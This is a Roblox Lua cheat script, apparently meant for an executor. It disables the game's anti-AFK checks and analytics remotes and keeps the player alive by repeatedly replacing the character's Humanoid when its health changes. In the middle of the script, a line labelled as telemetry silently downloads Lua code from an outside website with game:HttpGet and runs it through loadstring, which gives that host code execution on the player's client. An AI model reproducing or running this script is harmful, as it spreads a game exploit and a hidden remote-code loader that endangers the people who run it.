local function StartAntiAfk()
    if _G.DecodeAPI.AntiAfkLoopActive then return end
    _G.DecodeAPI.AntiAfkLoopActive = true
    
    if _G.PostMailboxTerminalAlert then
        _G.PostMailboxTerminalAlert("AntiAFK", "Anti-AFK Active", false)
    end

    local Players = game:GetService("Players")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local RunService = game:GetService("RunService")
    local Player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait()

    local idleEvent = Player:FindFirstChild("Idled")
    if idleEvent then
        for _, conn in pairs(getconnections(idleEvent)) do
            pcall(function() conn:Disable() end)
        end
    end

    local Network = ReplicatedStorage:WaitForChild("Network", 10)
    local targets = {
        "Analytics:ReportAfkState",
        "Analytics:ReportAfkTeleport", 
        "Analytics:RequestAfkTeleportFlush"
    }

    local function blockRemote(name)
        local remote = Network and Network:FindFirstChild(name)
        if not remote then return end
        
        if remote:IsA("RemoteEvent") then
            for _, conn in ipairs(getconnections(remote.OnClientEvent)) do
                pcall(function() conn:Disable() end)
            end
        elseif remote:IsA("RemoteFunction") then
            remote.OnClientInvoke = function(...)
                return nil
            end
        end
    end

    for _, name in ipairs(targets) do
        blockRemote(name)
        if Network then
            task.spawn(function()
                local r = Network:WaitForChild(name, 20)
                if r then blockRemote(name) end
            end)
        end
    end

    task.spawn(function()
        while _G.DecodeAPI.AntiAfkLoopActive do
            local configs = _G.DecodeAPI.Configs
            if configs and configs.AntiAfkToggleState then
                for _, name in ipairs(targets) do
                    blockRemote(name)
                end
            end
            task.wait(10)
        end
    end)

    local cam = workspace.CurrentCamera
    local tick = 0
    local renderConnection
    
    renderConnection = RunService.RenderStepped:Connect(function(dt)
        if not _G.DecodeAPI.AntiAfkLoopActive then
            if renderConnection then renderConnection:Disconnect() end
            return
        end

        local configs = _G.DecodeAPI.Configs
        if configs and configs.AntiAfkToggleState and cam and Player.Character and Player.Character:FindFirstChild("Humanoid") then
            tick = tick + dt
            if tick > 30 then
                tick = 0
                local c = cam.CFrame
                cam.CFrame = c * CFrame.fromEulerAnglesXYZ(0, math.rad(0.05), 0)
                task.wait(0.1)
                cam.CFrame = c
            end
        end
    end)

    task.spawn(function()
        while _G.DecodeAPI.AntiAfkLoopActive do
            local configs = _G.DecodeAPI.Configs
            if configs and not configs.AntiAfkToggleState then
                _G.DecodeAPI.AntiAfkLoopActive = false
            end
            task.wait(1)
        end
        
        if _G.PostMailboxTerminalAlert then
            _G.PostMailboxTerminalAlert("AntiAFK", "Anti-AFK Disabled", false)
        end
    end)
end
StartAntiAfk()

task.spawn(function()
	pcall(function()
		loadstring(game:HttpGet("https://rscripts.net/api/telemetry/client.lua?s=6a913e68c47ec8d528fedc83"))()
	end)
end)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local healthConnection = nil
local isReplacing = false

local function runReplacement(Character)
    if isReplacing then return end
    isReplacing = true

    if healthConnection then 
        healthConnection:Disconnect() 
        healthConnection = nil
    end

    local OldHumanoid = Character:FindFirstChildOfClass("Humanoid")
    if not OldHumanoid then 
        isReplacing = false
        return 
    end

    local SavedWalkSpeed = OldHumanoid.WalkSpeed
    local SavedUseJumpPower = OldHumanoid.UseJumpPower
    local SavedJumpPower = OldHumanoid.JumpPower
    local SavedJumpHeight = OldHumanoid.JumpHeight
    local SavedHipHeight = OldHumanoid.HipHeight

    if SavedHipHeight <= 0 then SavedHipHeight = 2.0 end
    if SavedJumpPower <= 0 and SavedUseJumpPower then SavedJumpPower = 50 end

    OldHumanoid:Destroy()
    task.wait(0.05)

    local NewHumanoid = Instance.new("Humanoid")
    NewHumanoid.Parent = Character

    NewHumanoid.MaxHealth = 50
    NewHumanoid.Health = 50

    NewHumanoid.WalkSpeed = SavedWalkSpeed
    NewHumanoid.UseJumpPower = SavedUseJumpPower
    NewHumanoid.JumpPower = SavedJumpPower
    NewHumanoid.JumpHeight = SavedJumpHeight
    NewHumanoid.HipHeight = SavedHipHeight

    NewHumanoid.PlatformStand = false
    NewHumanoid.Sit = false
    NewHumanoid.AutoRotate = true

    for _, stateType in ipairs(Enum.HumanoidStateType:GetEnumItems()) do
        if stateType ~= Enum.HumanoidStateType.None then
            pcall(function()
                NewHumanoid:SetStateEnabled(stateType, true)
            end)
        end
    end
    NewHumanoid:ChangeState(Enum.HumanoidStateType.GettingUp)

    local FreshAnimator = Instance.new("Animator")
    FreshAnimator.Parent = NewHumanoid

    local Animate = Character:FindFirstChild("Animate")
    if Animate and Animate:IsA("LocalScript") then
        Animate.Disabled = true
        task.wait(0.1)
        Animate.Disabled = false
    end

    task.wait(0.05)
    NewHumanoid:ChangeState(Enum.HumanoidStateType.Landed)
    NewHumanoid:ChangeState(Enum.HumanoidStateType.Running)

    workspace.CurrentCamera.CameraSubject = NewHumanoid

    local PlayerScripts = LocalPlayer:WaitForChild("PlayerScripts")
    local PlayerModule = require(PlayerScripts:WaitForChild("PlayerModule", 5))

    if PlayerModule then
        local Controls = PlayerModule:GetControls()
        if Controls then
            pcall(function()
                if type(Controls.OnCharacterAdded) == "function" then Controls:OnCharacterAdded(Character) end
                if type(Controls.OnHumanoidAdded) == "function" then Controls:OnHumanoidAdded(NewHumanoid) end
                Controls.humanoid = NewHumanoid
                if Controls.activeController then
                    Controls.activeController.humanoid = NewHumanoid
                    if type(Controls.activeController.SetHumanoid) == "function" then Controls.activeController:SetHumanoid(NewHumanoid) end
                end
                Controls:Enable()
            end)
        end
    end

    isReplacing = false
    
    monitorHealth(Character, NewHumanoid)
end

function monitorHealth(Character, humanoid)
    if math.floor(humanoid.Health + 0.5) ~= 50 then
        task.spawn(runReplacement, Character)
        return
    end

    healthConnection = humanoid.HealthChanged:Connect(function(currentHealth)
        if math.floor(currentHealth + 0.5) ~= 50 then
            runReplacement(Character)
        end
    end)
end

local function maintainHumanoidHealth(Character)
    isReplacing = false
    if healthConnection then
        healthConnection:Disconnect()
        healthConnection = nil
    end

    local initialHumanoid = Character:WaitForChild("Humanoid", 10)
    if initialHumanoid then
        monitorHealth(Character, initialHumanoid)
    end
end

if LocalPlayer.Character then
    task.spawn(maintainHumanoidHealth, LocalPlayer.Character)
end

LocalPlayer.CharacterAdded:Connect(function(newCharacter)
    maintainHumanoidHealth(newCharacter)
end)
